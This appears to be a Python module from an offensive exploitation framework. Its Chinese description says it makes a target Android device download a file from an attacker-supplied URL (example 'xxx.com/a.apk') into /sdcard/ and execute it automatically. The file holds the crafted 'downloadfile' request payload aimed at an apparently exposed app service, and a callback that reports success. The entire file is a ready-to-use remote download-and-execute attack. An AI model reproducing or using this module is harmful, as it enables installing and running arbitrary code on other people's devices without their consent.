# coding:utf-8
from libs.core.register import register
from libs.core.attrdict import AttribDict
from libs.core.config import cache
from libs.ui import UI

class DownloadFile(object):
    def __init__(self):
        pass

    ui = UI()
    info = {
        "Author": "Medici.Yan",
        "Description": u'''

    下载文件到 /sdcard/ 目录下, 并自动执行,
    非 apk 文件也会尝试执行

        URL        下载地址
        SAVE_PATH  保存到/sdcard/目录下

        eg:

            set URL http://xxx.com/a.apk
            set SAVE_PATH downloads/

            就会把 xxx.com/a.apk 文件下载到 /sdcard/downloads/ 目录下
        ''',
    }

    payload = "downloadfile?querydown=download&downloadurl={self.options.URL}&savepath" \
              "={self.options.SAVE_PATH}&filesize=1024&callback=t&mcmdf=inapp_"

    options = AttribDict()
    options.URL = ['http://', 'https://', 'ftp://', 'file://']
    options.SAVE_PATH = "."

    def callback(self, arg):
        _, res = arg

        if _:
            if res == 't && t({"error":0});':
                self.ui.notify.success('Download success!').info('Save in /sdcard/%s%s' % (
                    self.options.SAVE_PATH, self.options.URL.split('/')[-1]))
            else:
                self.ui.notify.error('Download fail (%s)!' % res)
        else:
            self.ui.notify.error('Download fail (%s)!' % res)

register(DownloadFile)


